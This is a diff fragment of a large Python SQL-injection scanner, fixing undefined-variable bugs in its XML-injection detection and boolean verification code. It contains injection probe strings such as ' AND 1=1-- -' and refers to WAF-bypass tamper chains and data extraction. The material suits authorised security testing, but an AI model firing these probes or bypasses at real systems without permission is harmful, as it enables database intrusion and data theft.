+                        _dbms_sess = getattr(getattr(self, '_scanner_ref', None), 'session', None)  # FIX6: was bare _scanner_ref (undefined), corrected to self._scanner_ref
                         if _dbms_sess is None:
                             _dbms_sess = getattr(self, 'session', None)
                         if (_dbms_sess is not None and
@@ -137794,7 +137795,7 @@ class ScannerV14(ScannerV13):
                                                         # BUG-XML-ESCALATION FIX (CRITICAL, Req 4/7/12/16):
                                                         # XML injection confirmed but NEVER recorded — no extraction, no report.
                                                         _xml_ed = next((d for d, ps in SQL_ERROR_PATTERNS.items()
-                                                                        if any(re.search(p, _xml2b, re.I) for p in ps)), 'MySQL')
+                                                                        if any(re.search(p, _xml_body, re.I) for p in ps)), 'MySQL')
                                                         _xml_surf_det = DetectionResult(
                                                             param=f"xml:{_xel}",
                                                             technique="E", payload=_xml_probe or "",
@@ -142142,7 +142143,8 @@ class SafeModeVerifier:
                         else " AND 1=2-- -")
             # Also use the cfg tamper chain if it's already been selected
             # (WAFMLBypassGenerator runs BEFORE SafeModeVerifier in _v14_init).
-            _smv_tc = getattr(config, "tamper_chain", None) or getattr(config, "_tamper_fns", None) or []
+            # FIX8: removed dead code that referenced undefined 'config' and caused NameError
+            # aborting the entire boolean capability check block. _smv_tc was never used.
             _bool_probes = [
                 (_smv_t0, _smv_f0, "certified"),           # CPDB certified pair
                 (" AND 1=1-- -", " AND 1=2-- -", "numeric"),  # canonical
@@ -142553,7 +142555,7 @@ class SafeModeVerifier:
                 # pages have natural response variation > Wasserstein threshold,
                 # causing every boolean probe to be falsely "confirmed" by Wasserstein.
                 try:
-                    config._oracle_set_by_instability = True
+                    self._oracle_set_by_instability = True  # FIX8b: was config (undefined), corrected to self
                 except Exception:
                     pass
         else:
